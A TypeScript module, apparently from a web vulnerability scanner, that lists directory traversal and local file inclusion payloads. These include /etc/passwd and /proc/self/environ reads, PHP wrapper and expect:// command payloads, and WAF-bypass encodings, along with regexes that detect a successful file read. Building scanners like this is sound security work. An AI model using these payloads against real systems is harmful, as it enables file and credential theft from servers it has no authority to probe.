/** Directory traversal / LFI payloads */
export const TRAVERSAL_PAYLOADS = [
  // Unix — /etc/passwd (most common, works on Linux/macOS)
  '../../../etc/passwd',
  '..\\..\\..\\etc\\passwd',
  '....//....//....//etc/passwd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc%252fpasswd',
  // Null byte bypass (PHP < 5.3.4, some other languages)
  '../../../etc/passwd%00',
  '../../../etc/passwd%00.jpg',
  '../../../etc/passwd%00.html',
  // Deeper traversal (for chrooted/nested deployments)
  '../../../../../etc/passwd',
  '../../../../../../etc/passwd',
  // Windows paths
  '..\\..\\..\\windows\\win.ini',
  '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
  // PHP wrappers (LFI → source code disclosure)
  'php://filter/convert.base64-encode/resource=index',
  'php://filter/convert.base64-encode/resource=../config',
  // Tomcat/Spring ..;/ bypass (semicolon treated as path parameter separator)
  '..;/..;/..;/etc/passwd',
  '..;/..;/..;/windows/win.ini',
  // UTF-8 overlong encoding (..%c0%af = ../ on vulnerable decoders)
  '..%c0%af..%c0%af..%c0%afetc/passwd',
  // URL-encoded backslash (Windows path traversal via %5c)
  '..%5c..%5c..%5cwindows%5cwin.ini',
  // /proc/self/environ — Linux env vars (often contains secrets/credentials)
  '../../../proc/self/environ',
  // Absolute paths (bypass weak sanitization)
  '/etc/passwd',
  'C:\\windows\\win.ini',
  // PHP input wrapper (read POST data — detects include() calls)
  'php://input',
  // Expect wrapper (less common but sometimes allowed)
  'expect://id',
  // Data wrapper (inline include — PHP 5.2+)
  'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
  // ── WAF bypass techniques ──────────────────────────────────────────
  // Double URL encoding (bypasses single-decode WAF + double-decode app)
  '..%252f..%252f..%252fetc/passwd',
  '..%252f..%252f..%252fwindows%252fwin.ini',
  // Unicode fullwidth characters (IIS/Tomcat/some WAFs)
  '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd',
  // Mixed slash encoding (forward + backslash combos)
  '..%5c..%2f..%5c..%2fetc/passwd',
  // Path normalization bypass — /./
  './.././.././../etc/passwd',
  // Reverse traversal — go up then back (confuses path canonicalization)
  '/var/www/../../etc/passwd',
  // Trailing dot bypass (Windows filesystem quirk)
  '..\\..\\..\\windows\\win.ini.',
  '..\\..\\..\\windows\\win.ini::$DATA',
  // URL-encoded null + traversal (bypass extension checks)
  '....//....//etc/passwd%00.png',
];

/** Patterns indicating directory traversal / LFI success */
export const TRAVERSAL_SUCCESS_PATTERNS = [
  /root:.*?:0:0/,              // /etc/passwd format
  /\[boot loader\]/i,          // Windows win.ini
  /\[extensions\]/i,           // Windows win.ini
  /\[fonts\]/i,                // Windows win.ini
  /localhost/,                  // Windows hosts file
  /PATH=|HOME=|USER=/,         // /proc/self/environ variables
  // PHP wrapper base64 output (starts with PD for <?php)
  /^[A-Za-z0-9+/]{40,}={0,2}$/m,
];
